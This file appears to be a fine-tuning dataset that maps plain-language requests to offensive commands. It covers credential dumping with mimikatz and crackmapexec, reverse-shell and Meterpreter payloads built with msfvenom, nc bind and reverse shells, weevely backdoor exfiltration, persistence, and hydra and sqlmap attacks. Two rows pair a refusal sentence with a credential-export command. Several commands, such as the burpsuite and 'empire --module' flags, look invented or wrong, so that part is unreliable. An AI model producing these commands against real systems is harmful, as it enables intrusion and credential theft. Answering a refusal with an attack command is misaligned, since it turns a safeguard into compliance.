{"input": "Load the powershell/credentials/mimikatz module in Empire for credential dumping.", "output": "empire --module powershell/credentials/mimikatz"}
{"input": "Run powershell/credentials/mimikatz via Empire to dump credentials.", "output": "empire --module powershell/credentials/mimikatz"}
{"input": "Perform a pass-the-hash against admin on domain.local using NTLM hash hash for lateral movement.", "output": "mimikatz sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash"}
{"input": "Laterally move by authenticating as admin on domain.local with the NTLM hash hash.", "output": "mimikatz sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash"}
{"input": "Run whoami over WinRM on 192.168.1.100 for command execution.", "output": "crackmapexec winrm 192.168.1.100 -u user -p pass -x whoami"}
{"input": "Execute a simple identity check on 192.168.1.100 via WinRM.", "output": "crackmapexec winrm 192.168.1.100 -u user -p pass -x whoami"}
{"input": "Dump SAM hashes from 192.168.1.100.", "output": "crackmapexec smb 192.168.1.100 --sam"}
{"input": "Perform credential dumping of the SAM on 192.168.1.100.", "output": "crackmapexec smb 192.168.1.100 --sam"}
{"input": "For data exfiltration, listen on port 4444 and write the incoming file to output.txt.", "output": "nc -lvp 4444 > output.txt"}
{"input": "Receive a file from a remote host on 4444 and save it as output.txt.", "output": "nc -lvp 4444 > output.txt"}
{"input": "List SMB shares on 192.168.1.100.", "output": "crackmapexec smb 192.168.1.100 --shares"}
{"input": "Perform SMB enumeration against 192.168.1.100 to identify accessible shares.", "output": "crackmapexec smb 192.168.1.100 --shares"}
{"input": "Enable Remote Desktop on the compromised system to aid persistence.", "output": "use post/windows/manage/enable_rdp"}
{"input": "Turn on RDP on the compromised host to maintain access.", "output": "use post/windows/manage/enable_rdp"}
{"input": "Enumerate Active Directory and compress the collected data into a zip archive.", "output": "bloodhound-python -c All --zip"}
{"input": "Gather AD enumeration data and output it as a zipped package.", "output": "bloodhound-python -c All --zip"}
{"input": "Generate a DLL stager for persistence.", "output": "empire --stager dll"}
{"input": "Create a DLL-based stager payload to maintain persistence.", "output": "empire --stager dll"}
{"input": "Dump SAM database credentials.", "output": "mimikatz lsadump::sam"}
{"input": "Perform credential dumping from the SAM database.", "output": "mimikatz lsadump::sam"}
{"input": "Exfiltrate /etc/passwd from http://example.com/shell.php via the PHP backdoor.", "output": "weevely http://example.com/shell.php password :file_download /etc/passwd"}
{"input": "Use the PHP backdoor at http://example.com/shell.php to download /etc/passwd for data exfiltration.", "output": "weevely http://example.com/shell.php password :file_download /etc/passwd"}
{"input": "Enumerate Active Directory via the Global Catalog at dc.domain.local.", "output": "bloodhound-python -u user -p pass -gc dc.domain.local"}
{"input": "Perform AD enumeration against the Global Catalog server dc.domain.local.", "output": "bloodhound-python -u user -p pass -gc dc.domain.local"}
{"input": "Connect to the remote listener at 192.168.1.100 on port 4444 with verbose output.", "output": "nc -nv 192.168.1.100 4444"}
{"input": "Open a reverse shell to 192.168.1.100:4444 and display verbose connection details.", "output": "nc -nv 192.168.1.100 4444"}
{"input": "Escalate privileges by acquiring a SYSTEM token on this host.", "output": "mimikatz token::elevate"}
{"input": "Attempt SYSTEM token elevation to achieve privilege escalation.", "output": "mimikatz token::elevate"}
{"input": "From the backdoor at http://example.com/shell.php, find SUID binaries that could aid privilege escalation.", "output": "weevely http://example.com/shell.php password :audit_suidbin"}
{"input": "Audit SUID binaries via the backdoor on http://example.com/shell.php to identify privilege escalation paths.", "output": "weevely http://example.com/shell.php password :audit_suidbin"}
{"input": "Create a scheduled task to maintain persistence on the target.", "output": "empire --module powershell/persistence/schtasks"}
{"input": "Set up persistence by adding a scheduled task after compromise.", "output": "empire --module powershell/persistence/schtasks"}
{"input": "Execute PowerShell on 192.168.1.100 via WinRM for command execution.", "output": "crackmapexec winrm 192.168.1.100 -u user -p pass --ps-exec"}
{"input": "Run a command on 192.168.1.100 using WinRM-backed PowerShell execution.", "output": "crackmapexec winrm 192.168.1.100 -u user -p pass --ps-exec"}
{"input": "Enumerate AD and ensure no passwords are stored.", "output": "bloodhound-python -u user -p pass --no-pass"}
{"input": "Perform AD enumeration without saving any passwords to disk.", "output": "bloodhound-python -u user -p pass --no-pass"}
{"input": "Dump password hashes from the system as part of credential dumping.", "output": "use post/windows/gather/hashdump"}
{"input": "Extract the system's password hashes to support credential dumping.", "output": "use post/windows/gather/hashdump"}
{"input": "Gather system information through the backdoor at http://example.com/shell.php.", "output": "weevely http://example.com/shell.php password :system_info"}
{"input": "Perform system enumeration via http://example.com/shell.php to collect host details.", "output": "weevely http://example.com/shell.php password :system_info"}
{"input": "Decrypt DPAPI credentials stored in cred.bin.", "output": "mimikatz dpapi::cred /in:cred.bin"}
{"input": "Dump credentials from cred.bin by decrypting the DPAPI data.", "output": "mimikatz dpapi::cred /in:cred.bin"}
{"input": "Enumerate user accounts on 192.168.1.100.", "output": "crackmapexec smb 192.168.1.100 --users"}
{"input": "Gather a list of users from the host at 192.168.1.100.", "output": "crackmapexec smb 192.168.1.100 --users"}
{"input": "Set up a bind shell listener on port 4444 that serves /bin/bash.", "output": "nc -lvp 4444 -e /bin/bash"}
{"input": "Create a bind shell on 4444 exposing /bin/bash.", "output": "nc -lvp 4444 -e /bin/bash"}
{"input": "Delete /tmp/malware using the PHP backdoor at http://example.com/shell.php.", "output": "weevely http://example.com/shell.php password :file_rm /tmp/malware"}
{"input": "Through the backdoor at http://example.com/shell.php, remove the file /tmp/malware.", "output": "weevely http://example.com/shell.php password :file_rm /tmp/malware"}
{"input": "Enumerate domain information.", "output": "use post/windows/gather/enum_domain"}
{"input": "Perform domain enumeration to gather domain details.", "output": "use post/windows/gather/enum_domain"}
{"input": "Collect session data only for AD enumeration.", "output": "bloodhound-python -u user -p pass --collectionmethod Session"}
{"input": "For AD enumeration, gather just session information.", "output": "bloodhound-python -u user -p pass --collectionmethod Session"}
{"input": "Scan 192.168.1.100 for open ports 1-1000 for network enumeration.", "output": "nc -z 192.168.1.100 1-1000"}
{"input": "Enumerate listening services on 192.168.1.100 within ports 1 through 1000.", "output": "nc -z 192.168.1.100 1-1000"}
{"input": "Install an executable to establish persistence on the target.", "output": "use post/windows/manage/persistence_exe"}
{"input": "Set up persistence by installing an executable on the system.", "output": "use post/windows/manage/persistence_exe"}
{"input": "Start a keylogger on the agent to capture keystrokes for data collection.", "output": "empire --module powershell/collection/keylogger"}
{"input": "Begin data collection by enabling a keylogger on the agent.", "output": "empire --module powershell/collection/keylogger"}
{"input": "Retrieve the password policy from 192.168.1.100.", "output": "crackmapexec smb 192.168.1.100 --pass-pol"}
{"input": "Perform policy enumeration on 192.168.1.100 to obtain its password policy.", "output": "crackmapexec smb 192.168.1.100 --pass-pol"}
{"input": "Move laterally using the PsExec technique.", "output": "empire --module powershell/lateral_movement/invoke_psexec"}
{"input": "Execute a PsExec-based lateral movement step.", "output": "empire --module powershell/lateral_movement/invoke_psexec"}
{"input": "Run a SQL query through the backdoor at http://example.com/shell.php for database access.", "output": "weevely http://example.com/shell.php password :sql_query 'SELECT * FROM users'"}
{"input": "Use the backdoor on http://example.com/shell.php to access the database and execute a query.", "output": "weevely http://example.com/shell.php password :sql_query 'SELECT * FROM users'"}
{"input": "Create a skeleton key for persistence.", "output": "mimikatz misc::skeleton"}
{"input": "Set up a skeleton key to maintain persistence.", "output": "mimikatz misc::skeleton"}
{"input": "Send the HTTP request from request.txt to 192.168.1.100 on port 80.", "output": "nc -v 192.168.1.100 80 < request.txt"}
{"input": "Exfiltrate data by delivering request.txt as an HTTP request to 192.168.1.100:80.", "output": "nc -v 192.168.1.100 80 < request.txt"}
{"input": "List Windows Vault credentials for credential dumping.", "output": "mimikatz vault::list"}
{"input": "Dump credentials stored in Windows Vault.", "output": "mimikatz vault::list"}
{"input": "Use WMI to trigger command execution on 192.168.1.100.", "output": "crackmapexec smb 192.168.1.100 --exec-method wmiexec"}
{"input": "Perform command execution against 192.168.1.100 via WMI.", "output": "crackmapexec smb 192.168.1.100 --exec-method wmiexec"}
{"input": "Capture a screenshot from an agent for data collection.", "output": "empire --module powershell/management/get_screenshot"}
{"input": "Collect data by grabbing a screenshot from the agent.", "output": "empire --module powershell/management/get_screenshot"}
{"input": "Enumerate Active Directory using NTLM hash authentication.", "output": "bloodhound-python -u user -p pass --hashes ntlm"}
{"input": "Perform AD enumeration while authenticating with NTLM hashes.", "output": "bloodhound-python -u user -p pass --hashes ntlm"}
{"input": "Enumerate installed applications on the target for system enumeration.", "output": "use post/windows/gather/enum_applications"}
{"input": "Gather a list of installed software to support system enumeration.", "output": "use post/windows/gather/enum_applications"}
{"input": "Enumerate AD and save the collected data to /tmp/ad_data.", "output": "bloodhound-python -u user -p pass --output /tmp/ad_data"}
{"input": "Gather AD enumeration results and store them under /tmp/ad_data.", "output": "bloodhound-python -u user -p pass --output /tmp/ad_data"}
{"input": "Use the backdoor at http://example.com/shell.php to create a zip archive for exfiltration.", "output": "weevely http://example.com/shell.php password :file_zip /var/www backup.zip"}
{"input": "Zip data through the http://example.com/shell.php backdoor to support data exfiltration.", "output": "weevely http://example.com/shell.php password :file_zip /var/www backup.zip"}
{"input": "Set up a telnet-compatible listener on port 4444 to catch a reverse shell.", "output": "nc -lvp 4444 -t"}
{"input": "Listen on 4444 for a reverse shell using a telnet-friendly listener.", "output": "nc -lvp 4444 -t"}
{"input": "Perform a DCSync to extract AD credentials for credential dumping.", "output": "empire --module powershell/credentials/dcsync"}
{"input": "Dump credentials from AD using a DCSync operation.", "output": "empire --module powershell/credentials/dcsync"}
{"input": "Add a new user account on the system to maintain persistence.", "output": "use post/windows/manage/add_user"}
{"input": "Create a local user for persistence after compromise.", "output": "use post/windows/manage/add_user"}
{"input": "List system certificates on this host for enumeration.", "output": "mimikatz crypto::certificates"}
{"input": "Enumerate installed certificates on this system.", "output": "mimikatz crypto::certificates"}
{"input": "Connect to the reverse shell listener at 192.168.1.100:4444 with a timeout.", "output": "nc -w 3 192.168.1.100 4444"}
{"input": "Establish a reverse shell connection to 192.168.1.100 on port 4444, ensuring a timeout.", "output": "nc -w 3 192.168.1.100 4444"}
{"input": "Enumerate Active Directory over LDAPS on port 636.", "output": "bloodhound-python -u user -p pass --ldap-port 636"}
{"input": "Collect AD data via LDAPS using port 636.", "output": "bloodhound-python -u user -p pass --ldap-port 636"}
{"input": "Dump the NTDS.dit from the domain controller at 192.168.1.100 for credential dumping.", "output": "crackmapexec smb 192.168.1.100 --ntds"}
{"input": "Perform a credential dump by extracting NTDS.dit from the DC at 192.168.1.100.", "output": "crackmapexec smb 192.168.1.100 --ntds"}
{"input": "Open the patch enumeration component to list installed patches for system enumeration.", "output": "use post/windows/gather/enum_patches"}
{"input": "Prepare to enumerate installed patches on the system as part of system enumeration.", "output": "use post/windows/gather/enum_patches"}
{"input": "Run PowerView to enumerate Active Directory.", "output": "empire --module powershell/management/powerview"}
{"input": "Launch PowerView to perform AD enumeration.", "output": "empire --module powershell/management/powerview"}
{"input": "Enumerate databases at http://example.com via SQL injection.", "output": "sqlmap -u http://example.com --dbs"}
{"input": "Identify which databases are accessible through SQL injection on http://example.com.", "output": "sqlmap -u http://example.com --dbs"}
{"input": "Establish a proxy through the backdoor at http://example.com/shell.php to enable network pivoting.", "output": "weevely http://example.com/shell.php password :net_proxy"}
{"input": "Use the backdoor on http://example.com/shell.php to set up a pivoting proxy.", "output": "weevely http://example.com/shell.php password :net_proxy"}
{"input": "Launch Burp Suite to begin web vulnerability testing.", "output": "burpsuite"}
{"input": "Open Burp Suite for web application testing.", "output": "burpsuite"}
{"input": "Launch the Metasploit exploitation framework.", "output": "msfconsole"}
{"input": "Open Metasploit to begin vulnerability exploitation.", "output": "msfconsole"}
{"input": "Brute-force SSH credentials on 192.168.1.100.", "output": "hydra -l admin -P wordlist.txt ssh://192.168.1.100"}
{"input": "Perform password cracking against the SSH service at 192.168.1.100.", "output": "hydra -l admin -P wordlist.txt ssh://192.168.1.100"}
{"input": "I can't assist with credential dumping or exporting plaintext credentials.", "output": "mimikatz logonpasswords /export"}
{"input": "Only high-level discussion about credential dumping and exporting plaintext credentials is appropriate.", "output": "mimikatz logonpasswords /export"}
{"input": "Scan 192.168.1.100 for vulnerabilities using NSE scripts.", "output": "nmap --script vuln 192.168.1.100"}
{"input": "Perform vulnerability scanning on 192.168.1.100 with appropriate NSE checks.", "output": "nmap --script vuln 192.168.1.100"}
{"input": "Enumerate database tables via SQL injection at http://example.com.", "output": "sqlmap -u http://example.com --tables"}
{"input": "List all tables through SQL injection against http://example.com.", "output": "sqlmap -u http://example.com --tables"}
{"input": "Search Exploit-DB for MS17-010 exploits.", "output": "searchsploit ms17-010"}
{"input": "Look up MS17-010 in Exploit-DB to find available exploit code.", "output": "searchsploit ms17-010"}
{"input": "Prepare to exploit the MS17-010 SMB vulnerability for remote code execution.", "output": "use exploit/windows/smb/ms17_010_eternalblue"}
{"input": "Select the exploit that achieves RCE via the MS17-010 SMB flaw.", "output": "use exploit/windows/smb/ms17_010_eternalblue"}
{"input": "Brute-force FTP credentials on ftp://192.168.1.100.", "output": "hydra -L users.txt -P wordlist.txt ftp://192.168.1.100"}
{"input": "Perform password cracking against the FTP service at ftp://192.168.1.100.", "output": "hydra -L users.txt -P wordlist.txt ftp://192.168.1.100"}
{"input": "Create a reverse TCP Meterpreter payload that callbacks to 192.168.1.100 on port 4444.", "output": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe"}
{"input": "Generate the payload and write it to payload.exe with LHOST 192.168.1.100 and LPORT 4444.", "output": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe"}
{"input": "Exploit SQL injection on http://example.com to obtain an OS shell.", "output": "sqlmap -u http://example.com --os-shell"}
{"input": "Attempt to spawn an OS shell via SQLi against http://example.com.", "output": "sqlmap -u http://example.com --os-shell"}
{"input": "Start the Burp Suite proxy to intercept application traffic.", "output": "burpsuite --proxy"}
{"input": "Spin up the proxy to capture and inspect traffic in Burp Suite.", "output": "burpsuite --proxy"}
{"input": "Scan 192.168.1.100 for the MS17-010 SMB vulnerability.", "output": "nmap --script smb-vuln-ms17-010 192.168.1.100"}
{"input": "Perform vulnerability scanning on 192.168.1.100 to check for MS17-010.", "output": "nmap --script smb-vuln-ms17-010 192.168.1.100"}
{"input": "Search Exploit-DB for publicly known WordPress exploits.", "output": "searchsploit wordpress"}
{"input": "Look up WordPress exploit listings on Exploit-DB.", "output": "searchsploit wordpress"}
{"input": "Brute-force the web login form at http://example.com/login.", "output": "hydra -l admin -P wordlist.txt http-post-form://example.com/login"}
{"input": "Perform password cracking against the HTTP form on http://example.com/login.", "output": "hydra -l admin -P wordlist.txt http-post-form://example.com/login"}
{"input": "Run the Burp Suite scanner to perform a vulnerability scan.", "output": "burpsuite --scanner"}
{"input": "Start a vulnerability scanning session using Burp Suite's scanner.", "output": "burpsuite --scanner"}
{"input": "Select the IIS MS15-034 exploit for remote code execution.", "output": "use exploit/windows/http/iis_ms15_034"}
{"input": "Prepare the IIS MS15-034 module to perform RCE.", "output": "use exploit/windows/http/iis_ms15_034"}
{"input": "Exploit the Tomcat Manager upload vulnerability in the web application.", "output": "use exploit/multi/http/tomcat_mgr_upload"}
{"input": "Abuse the Tomcat Manager upload to compromise the web application.", "output": "use exploit/multi/http/tomcat_mgr_upload"}
{"input": "Create a Linux reverse shell payload that connects back to 192.168.1.100.", "output": "msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > payload.elf"}
{"input": "Build a reverse shell for Linux targeting callback to 192.168.1.100.", "output": "msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > payload.elf"}
{"input": "Search Exploit-DB for Apache exploits and include web links in the results.", "output": "searchsploit -w apache"}
{"input": "Find Apache exploit entries on Exploit-DB with their web URLs.", "output": "searchsploit -w apache"}
{"input": "Create a PHP Meterpreter payload with LHOST 192.168.1.100 and LPORT 4444, and write it to shell.php.", "output": "msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php"}
{"input": "Generate a PHP Meterpreter payload configured for 192.168.1.100:4444 and output it to shell.php.", "output": "msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php"}
{"input": "Scan 192.168.1.100 for the Struts CVE-2017-5638 vulnerability.", "output": "nmap --script http-vuln-cve2017-5638 192.168.1.100"}
{"input": "Perform a vulnerability scan on 192.168.1.100 to check for CVE-2017-5638 in Struts.", "output": "nmap --script http-vuln-cve2017-5638 192.168.1.100"}
{"input": "Brute-force RDP credentials against rdp://192.168.1.100.", "output": "hydra -L users.txt -P wordlist.txt rdp://192.168.1.100"}
{"input": "Perform password cracking on the RDP service at rdp://192.168.1.100.", "output": "hydra -L users.txt -P wordlist.txt rdp://192.168.1.100"}
{"input": "Open Burp Suite Repeater for manual testing.", "output": "burpsuite --repeater"}
{"input": "Use the repeater for manual exploitation.", "output": "burpsuite --repeater"}
{"input": "Create a reverse TCP DLL payload that connects to 192.168.1.100:4444 and save it as payload.dll.", "output": "msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll > payload.dll"}
{"input": "Generate a payload DLL for a reverse shell to 192.168.1.100 on port 4444, writing to payload.dll.", "output": "msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll > payload.dll"}
{"input": "Perform advanced SQL injection testing against http://example.com.", "output": "sqlmap -u http://example.com --data 'id=1' --level 5"}
{"input": "Thoroughly probe http://example.com for SQL injection vulnerabilities.", "output": "sqlmap -u http://example.com --data 'id=1' --level 5"}
{"input": "Brute-force Telnet credentials on telnet://192.168.1.100.", "output": "hydra -l admin -P wordlist.txt telnet://192.168.1.100"}
{"input": "Perform password cracking against telnet://192.168.1.100's Telnet service.", "output": "hydra -l admin -P wordlist.txt telnet://192.168.1.100"}
{"input": "Look up shellcode exploits in Exploit-DB.", "output": "searchsploit -t shellcode"}
{"input": "Find Exploit-DB entries related to shellcode.", "output": "searchsploit -t shellcode"}
{"input": "Start Burp Suite Intruder to run automated exploitation.", "output": "burpsuite --intruder"}
{"input": "Open Burp Suite's Intruder to launch automated attacks.", "output": "burpsuite --intruder"}
{"input": "Read /etc/passwd from http://example.com via SQL injection.", "output": "sqlmap -u http://example.com --file-read=/etc/passwd"}
{"input": "Use file access through SQL injection on http://example.com to retrieve /etc/passwd.", "output": "sqlmap -u http://example.com --file-read=/etc/passwd"}
{"input": "Select the exploit for a PHP include vulnerability in a web application.", "output": "use exploit/unix/webapp/php_include"}
{"input": "Load the PHP include web application exploit to begin web application exploitation.", "output": "use exploit/unix/webapp/php_include"}
{"input": "Brute-force FTP credentials with NSE against 192.168.1.100.", "output": "nmap --script ftp-brute 192.168.1.100"}
{"input": "Perform a password cracking attempt on FTP at 192.168.1.100 using NSE.", "output": "nmap --script ftp-brute 192.168.1.100"}
{"input": "Select the BlueKeep RDP exploit module for remote code execution.", "output": "use exploit/windows/rdp/cve_2019_0708_bluekeep"}
{"input": "Load the BlueKeep exploit to achieve RCE over RDP.", "output": "use exploit/windows/rdp/cve_2019_0708_bluekeep"}
{"input": "Dump the database contents from http://example.com using SQL injection for data exfiltration.", "output": "sqlmap -u http://example.com --dump"}
{"input": "Exfiltrate data by exploiting SQL injection to dump all DB data from http://example.com.", "output": "sqlmap -u http://example.com --dump"}
{"input": "Generate a Java Meterpreter reverse_tcp payload calling back to 192.168.1.100:4444 and save it as payload.jar.", "output": "msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f jar > payload.jar"}
{"input": "Create a Java Meterpreter JAR that connects back to 192.168.1.100 on port 4444, output file payload.jar.", "output": "msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f jar > payload.jar"}
{"input": "Scan 192.168.1.100 for the Shellshock vulnerability.", "output": "nmap --script http-shellshock 192.168.1.100"}
{"input": "Perform a vulnerability scan for Shellshock against 192.168.1.100.", "output": "nmap --script http-shellshock 192.168.1.100"}
{"input": "Crawl a website using the Burp Suite spider for web reconnaissance.", "output": "burpsuite --spider"}
{"input": "Map the site's structure by spidering it with Burp Suite during reconnaissance.", "output": "burpsuite --spider"}
{"input": "Download the exploit with ID 12345 from Exploit-DB.", "output": "searchsploit -m 12345"}
{"input": "Retrieve Exploit-DB exploit 12345.", "output": "searchsploit -m 12345"}
{"input": "Search Exploit-DB for apache and output the results in JSON.", "output": "searchsploit -j apache"}
{"input": "Find apache entries on Exploit-DB and return them as JSON.", "output": "searchsploit -j apache"}
{"input": "Brute-force SMTP credentials using NSE against 192.168.1.100.", "output": "nmap --script smtp-brute 192.168.1.100"}
{"input": "Perform password cracking on the SMTP service at 192.168.1.100.", "output": "nmap --script smtp-brute 192.168.1.100"}
{"input": "Load Burp Suite extensions to enable custom exploitation workflows.", "output": "burpsuite --extender"}
{"input": "Open the Burp Suite extensions interface to add modules for custom exploits.", "output": "burpsuite --extender"}
{"input": "Prepare for client-side exploitation of the Windows shortcut icon vulnerability.", "output": "use exploit/windows/browser/ms10_046_shortcut_icon_dllloader"}
{"input": "Set up to exploit the Windows shortcut icon vulnerability via a client-side attack.", "output": "use exploit/windows/browser/ms10_046_shortcut_icon_dllloader"}
{"input": "Write /tmp/shell.php to http://example.com via SQL injection for file access.", "output": "sqlmap -u http://example.com --file-write=/tmp/shell.php"}
{"input": "Gain file access by using SQL injection to place /tmp/shell.php on http://example.com.", "output": "sqlmap -u http://example.com --file-write=/tmp/shell.php"}
{"input": "Brute-force the HTTP GET login on http-get://example.com/admin.", "output": "hydra -l admin -P wordlist.txt http-get://example.com/admin"}
{"input": "Attempt password cracking against the endpoint at http-get://example.com/admin.", "output": "hydra -l admin -P wordlist.txt http-get://example.com/admin"}
{"input": "Update the local Exploit-DB database to the latest version.", "output": "searchsploit -u"}
{"input": "Refresh the Exploit-DB exploit database on this system.", "output": "searchsploit -u"}
{"input": "Generate an Android Meterpreter payload that connects to 192.168.1.100 on port 4444 and write it to payload.apk.", "output": "msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f apk > payload.apk"}
{"input": "Build an Android Meterpreter payload that calls back to 192.168.1.100:4444, saving the output as payload.apk.", "output": "msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f apk > payload.apk"}
{"input": "Select the exploit for the Struts2 REST XStream vulnerability to prepare web application exploitation.", "output": "use exploit/linux/http/apache_struts2_rest_xstream"}
{"input": "Load an exploit targeting the Struts2 REST XStream flaw for web app testing.", "output": "use exploit/linux/http/apache_struts2_rest_xstream"}
{"input": "Probe http://example.com for SQL injection, using a tamper script to bypass the WAF.", "output": "sqlmap -u http://example.com --tamper=space2comment"}
{"input": "Attempt SQLi against http://example.com and enable a tamper technique to evade WAF filtering.", "output": "sqlmap -u http://example.com --tamper=space2comment"}
{"input": "Scan 192.168.1.100 for the Drupal CVE-2014-3704 vulnerability.", "output": "nmap --script http-vuln-cve2014-3704 192.168.1.100"}
{"input": "Perform vulnerability scanning on 192.168.1.100 to check for Drupal CVE-2014-3704.", "output": "nmap --script http-vuln-cve2014-3704 192.168.1.100"}
{"input": "Brute-force SMB credentials on smb://192.168.1.100.", "output": "hydra -L users.txt -P wordlist.txt smb://192.168.1.100"}
{"input": "Perform password cracking attempts against the SMB service at smb://192.168.1.100.", "output": "hydra -L users.txt -P wordlist.txt smb://192.168.1.100"}
{"input": "Brute-force MySQL credentials on mysql://192.168.1.100.", "output": "hydra -L users.txt -P wordlist.txt mysql://192.168.1.100"}
{"input": "Crack MySQL login passwords against mysql://192.168.1.100.", "output": "hydra -L users.txt -P wordlist.txt mysql://192.168.1.100"}
{"input": "Show the local path to the exploit with ID 12345.", "output": "searchsploit -p 12345"}
{"input": "Retrieve the exploit file path for ID 12345.", "output": "searchsploit -p 12345"}
{"input": "Set the target scope to http://example.com in Burp Suite for web application testing.", "output": "burpsuite --target-scope http://example.com"}
{"input": "Restrict Burp Suite's testing scope to http://example.com before web application testing.", "output": "burpsuite --target-scope http://example.com"}
{"input": "Prepare to exploit the Java JMXBean vulnerability for remote code execution.", "output": "use exploit/multi/misc/java_jre17_jmxbean"}
{"input": "Attempt remote code execution by targeting the Java JMXBean vulnerability.", "output": "use exploit/multi/misc/java_jre17_jmxbean"}
{"input": "Run a non-interactive SQL injection against http://example.com.", "output": "sqlmap -u http://example.com --batch"}
{"input": "Perform SQLi on http://example.com without any prompts.", "output": "sqlmap -u http://example.com --batch"}
{"input": "Brute-force SSH credentials on 192.168.1.100 using NSE.", "output": "nmap --script ssh-brute 192.168.1.100"}
{"input": "Perform SSH password cracking against 192.168.1.100 with an NSE script.", "output": "nmap --script ssh-brute 192.168.1.100"}
{"input": "Examine the exploit code for ID 12345 as part of exploit analysis.", "output": "searchsploit -x 12345"}
{"input": "Open and review exploit ID 12345 to study its code.", "output": "searchsploit -x 12345"}
{"input": "Select the PsExec approach to achieve remote code execution on a Windows host using valid credentials.", "output": "use exploit/windows/smb/psexec"}
{"input": "Prepare to exploit a Windows system via PsExec with credentials to get RCE.", "output": "use exploit/windows/smb/psexec"}
{"input": "Open Burp Suite Sequencer for session analysis to support exploitation.", "output": "burpsuite --sequencer"}
{"input": "Use Burp Suite's Sequencer to analyze sessions for exploitation.", "output": "burpsuite --sequencer"}
{"input": "Create an HTTPS Meterpreter payload that connects back to 192.168.1.100:443 and save it as payload.exe.", "output": "msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe > payload.exe"}
{"input": "For payload creation, generate an HTTPS Meterpreter stub to call home to 192.168.1.100 on port 443, output to payload.exe.", "output": "msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe > payload.exe"}
{"input": "Brute-force VNC access on vnc://192.168.1.100.", "output": "hydra -l admin -P wordlist.txt vnc://192.168.1.100"}
{"input": "Perform password cracking against the VNC endpoint at vnc://192.168.1.100.", "output": "hydra -l admin -P wordlist.txt vnc://192.168.1.100"}
{"input": "Check for the HTTP CVE-2015-1635 vulnerability on 192.168.1.100.", "output": "nmap --script http-vuln-cve2015-1635 192.168.1.100"}
{"input": "Perform a vulnerability scan on 192.168.1.100 to detect CVE-2015-1635.", "output": "nmap --script http-vuln-cve2015-1635 192.168.1.100"}
{"input": "Select the Jenkins script console exploit for web application exploitation.", "output": "use exploit/multi/http/jenkins_script_console"}
{"input": "Load an exploit targeting the Jenkins script console to prepare for web app attacks.", "output": "use exploit/multi/http/jenkins_script_console"}
{"input": "Generate a Python Meterpreter payload that calls back to 192.168.1.100:4444 and save it as payload.py.", "output": "msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f py > payload.py"}
{"input": "Create a Python Meterpreter payload for 192.168.1.100 on port 4444, writing the output to payload.py.", "output": "msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f py > payload.py"}
{"input": "Create an encoded Meterpreter payload that connects back to 192.168.1.100:4444 and save it as payload.exe.", "output": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -f exe > payload.exe"}
{"input": "Build an encoded Meterpreter stager for 192.168.1.100 on port 4444, output to payload.exe.", "output": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -f exe > payload.exe"}
{"input": "Test for SQL injection on http://example.com using a cookie.", "output": "sqlmap -u http://example.com --cookie='id=1'"}
{"input": "Assess SQLi at http://example.com while including a cookie in the request.", "output": "sqlmap -u http://example.com --cookie='id=1'"}
{"input": "Open Burp Suite comparer to perform response analysis.", "output": "burpsuite --comparer"}
{"input": "Start the comparer in Burp Suite to analyze responses.", "output": "burpsuite --comparer"}
{"input": "Brute-force the custom HTTP login at example.com/login.", "output": "hydra -L users.txt -P wordlist.txt http-post-form://example.com/login:username=^USER^&password=^PASS^"}
{"input": "Perform password cracking against the form on example.com/login.", "output": "hydra -L users.txt -P wordlist.txt http-post-form://example.com/login:username=^USER^&password=^PASS^"}
{"input": "Scan 192.168.1.100 for the Rails CVE-2013-0156 vulnerability.", "output": "nmap --script http-vuln-cve2013-0156 192.168.1.100"}
{"input": "Perform vulnerability scanning against 192.168.1.100 to check for CVE-2013-0156 in Rails.", "output": "nmap --script http-vuln-cve2013-0156 192.168.1.100"}
{"input": "Search for remote code execution exploits.", "output": "searchsploit -e 'remote code execution'"}
{"input": "Look up remote code execution exploits as part of exploit search.", "output": "searchsploit -e 'remote code execution'"}
{"input": "Brute-force SIP credentials against sip://192.168.1.100.", "output": "hydra -l admin -P wordlist.txt sip://192.168.1.100"}
{"input": "Perform password cracking on the SIP service at sip://192.168.1.100.", "output": "hydra -l admin -P wordlist.txt sip://192.168.1.100"}
{"input": "Open the Burp Suite decoder to perform data manipulation during testing.", "output": "burpsuite --decoder"}
{"input": "Launch the decoder in Burp Suite to manipulate test data.", "output": "burpsuite --decoder"}
{"input": "Probe http://example.com for SQL injection, focusing on a MySQL backend.", "output": "sqlmap -u http://example.com --dbms=mysql"}
{"input": "Test http://example.com for MySQL-specific SQL injection behavior.", "output": "sqlmap -u http://example.com --dbms=mysql"}
{"input": "Exploit the PDF embedded executable vulnerability for a client-side attack.", "output": "use exploit/windows/fileformat/adobe_pdf_embedded_exe"}
{"input": "Prepare a client-side exploitation using a malicious PDF with an embedded executable.", "output": "use exploit/windows/fileformat/adobe_pdf_embedded_exe"}
